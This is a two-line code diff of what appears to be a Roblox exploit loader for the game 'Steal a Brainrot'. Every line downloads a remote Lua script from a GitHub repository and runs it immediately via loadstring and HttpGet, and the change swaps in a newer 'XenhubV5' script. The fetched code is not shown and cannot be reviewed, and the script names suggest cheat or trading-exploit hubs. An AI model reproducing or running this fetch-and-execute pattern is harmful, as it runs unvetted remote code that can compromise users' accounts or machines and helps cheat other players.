@@ -1,2 +1,2 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/delta-universal/Steal-a-brainrot-/refs/heads/main/Tradee"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/delta-universal/Steal-a-brainrot-/refs/heads/main/Xenhub"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/delta-universal/Steal-a-brainrot-/refs/heads/main/XenhubV5.lua"))()
